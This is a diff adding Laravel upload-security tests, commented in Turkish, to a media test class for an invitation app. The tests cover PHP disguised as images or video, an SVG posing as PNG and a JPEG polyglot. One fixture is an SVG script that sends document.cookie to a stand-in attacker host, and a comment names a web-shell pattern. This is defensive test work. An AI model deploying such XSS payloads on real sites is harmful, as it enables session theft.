@@ -366,6 +366,138 @@ final class MediaTest extends TestCase
         $this->assertStringStartsWith('media/'.MediaKind::Gallery->value.'/', $media->path);
     }
 
+    // ------------------------------------ DOSYA GUVENLIGI: GERCEK BAYTLAR (10.50)
+    //
+    // Yukaridaki testler UploadedFile::fake() kullaniyor ve sahte dosya tipini
+    // ICERIKTEN okumuyor (the_upload_is_validated_by_mime_not_extension'in
+    // notu). Asagidakiler gercek baytli bir dosyayla calisiyor: tip, uretimde
+    // oldugu gibi finfo ile dosyanin kendisinden okunuyor. Istemcinin
+    // bildirdigi ad ve tip her vakada YALAN.
+
+    /**
+     * 🔴 `.jpg` adli, `image/jpeg` diyen PHP kodu: icerik kazanir.
+     *
+     * Yuk BILEREK zararsiz. Gercek bir web-shell satiri (`system($_GET…)`)
+     * Windows Defender'in imzasina takiliyor: gecici dosya karantinaya
+     * alinip finfo "Invalid argument" ile 500 donuyordu. finfo icin ikisi de
+     * ayni sey: `text/x-php`.
+     */
+    #[Test]
+    public function php_code_named_as_a_jpeg_is_rejected_by_its_content(): void
+    {
+        [$user, $inv] = $this->ownedInvitation();
+
+        $this->withToken($this->tokenFor($user))
+            ->postJson($this->ownerUrl($inv), [
+                'kind' => MediaKind::Gallery->value,
+                'file' => $this->realUpload("<?php\necho 'DavetKart';\n", 'foto.jpg', 'image/jpeg'),
+            ])
+            ->assertUnprocessable()
+            ->assertJsonPath('error.fields.file.0.rule', 'mimetypes');
+
+        $this->assertDatabaseCount('media', 0);
+        $this->assertSame([], Storage::disk(Config::string('davetkart.media.disk'))->allFiles());
+    }
+
+    /**
+     * 🔴 Ayni saldiri VIDEO turunde, KIMLIKSIZ misafirden.
+     *
+     * Fotograf turlerinde `mimetypes:` kalkse bile `dimensions` kurali PHP
+     * dosyasini (goruntu olmadigi icin) yine eler. Videoda piksel siniri yok:
+     * orada `mimetypes:` TEK savunma. Mutasyonla goruldu (kilavuz: Faz 10, 10.50).
+     */
+    #[Test]
+    public function php_code_named_as_a_video_is_rejected_from_a_guest(): void
+    {
+        $inv = $this->openInvitation();
+
+        $this->postJson($this->guestUrl($inv), [
+            'kind' => MediaKind::RsvpVideo->value,
+            'file' => $this->realUpload("<?php\necho 'DavetKart';\n", 'klip.mp4', 'video/mp4'),
+        ])->assertUnprocessable();
+
+        $this->assertDatabaseCount('media', 0);
+        $this->assertSame([], Storage::disk(Config::string('davetkart.media.disk'))->allFiles());
+    }
+
+    /**
+     * SVG bir goruntu degil, bir BELGE: icinde betik calisir. Ayni kokenden
+     * sunulursa misafirin oturumunda calisan bir XSS olur. `.png` adiyla gelse
+     * de icerigi SVG.
+     */
+    #[Test]
+    public function an_svg_is_rejected_even_when_it_claims_to_be_a_png(): void
+    {
+        [$user, $inv] = $this->ownedInvitation();
+        $svg = '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
+            .'<script>fetch("https://saldirgan.example/?c="+document.cookie)</script></svg>';
+
+        $this->withToken($this->tokenFor($user))
+            ->postJson($this->ownerUrl($inv), [
+                'kind' => MediaKind::Gallery->value,
+                'file' => $this->realUpload($svg, 'logo.png', 'image/png'),
+            ])
+            ->assertUnprocessable()
+            ->assertJsonPath('error.fields.file.0.rule', 'mimetypes');
+
+        $this->assertDatabaseCount('media', 0);
+    }
+
+    /**
+     * Gercek bir JPEG, kendini PNG diye tanitiyor. Kabul edilir (icerik
+     * gecerli), ama kayda gecen tip ve diskteki uzanti ICERIKTEN gelir.
+     *
+     * Denetimde (TEST-DENETIMI §2) `getMimeType()` -> `getClientMimeType()`
+     * mutanti yesil kaliyordu: sahte dosyada ikisi ayni degeri doner.
+     */
+    #[Test]
+    public function a_real_jpeg_is_recorded_with_the_type_read_from_its_bytes(): void
+    {
+        Queue::fake();
+        [$user, $inv] = $this->ownedInvitation();
+
+        $this->withToken($this->tokenFor($user))
+            ->postJson($this->ownerUrl($inv), [
+                'kind' => MediaKind::Gallery->value,
+                'file' => $this->realUpload($this->jpegBytes(), 'foto.png', 'image/png'),
+            ])
+            ->assertCreated();
+
+        $media = Media::query()->sole();
+
+        $this->assertSame('image/jpeg', $media->mime_type);
+        $this->assertStringEndsWith('.jpg', $media->path);
+    }
+
+    /**
+     * 🔴 Polyglot: gecerli bir JPEG'in sonuna HTML/betik eklenmis, adi `.html`.
+     *
+     * Icerik denetimi ilk baytlara (sihirli sayi) bakar; bu dosya gercekten
+     * bir JPEG ve kabul edilir. Savunma bir sonraki katmanda: diskteki ad ve
+     * uzanti SUNUCUNUN. Istemcinin uzantisi kullanilsaydi dosya `.html` olarak
+     * sunulur ve tarayici sonundaki betigi calistirirdi.
+     */
+    #[Test]
+    public function a_jpeg_polyglot_is_stored_under_a_server_chosen_extension(): void
+    {
+        Queue::fake();
+        [$user, $inv] = $this->ownedInvitation();
+        $polyglot = $this->jpegBytes().'<script>alert(document.domain)</script>';
+
+        $this->withToken($this->tokenFor($user))
+            ->postJson($this->ownerUrl($inv), [
+                'kind' => MediaKind::Gallery->value,
+                'file' => $this->realUpload($polyglot, 'davetiye.html', 'text/html'),
+            ])
+            ->assertCreated();
+
+        $media = Media::query()->sole();
+
+        $this->assertSame('image/jpeg', $media->mime_type);
+        $this->assertStringEndsWith('.jpg', $media->path);
+        $this->assertStringNotContainsString('davetiye', $media->path);
+    }
+
     #[Test]
     public function an_oversized_file_is_rejected(): void
     {
@@ -912,6 +1044,34 @@ final class MediaTest extends TestCase
     private function ownerUrl(Invitation $invitation): string
     {
         return route('invitations.media.store', $invitation);
+    }
+
+    /**
+     * Gercek baytli bir yukleme (10.50): tip finfo ile ICERIKTEN okunur.
+     *
+     * `UploadedFile::fake()` tipi rapor edilen degerden ya da ADDAN uretir.
+     * Burada `$clientName` ve `$clientMime` saldirganin yazdigi degerler;
+     * `test: true` yalnizca is_uploaded_file() kontrolunu atlar.
+     */
+    private function realUpload(string $bytes, string $clientName, string $clientMime): UploadedFile
+    {
+        $path = (string) tempnam(sys_get_temp_dir(), 'dk-upload-');
+        file_put_contents($path, $bytes);
+
+        // Kabul edilen dosyayi store() tasir; reddedilen gecici klasorde kalmasin.
+        $this->beforeApplicationDestroyed(fn () => @unlink($path));
+
+        return new UploadedFile($path, $clientName, $clientMime, null, true);
+    }
+
+    /** GD ile uretilmis gercek bir JPEG. */
+    private function jpegBytes(): string
+    {
+        $image = imagecreatetruecolor(40, 30);
+        ob_start();
+        imagejpeg($image);
+
+        return (string) ob_get_clean();
     }
 
     private function galleryDeleteUrl(Invitation $invitation, string $mediaId): string
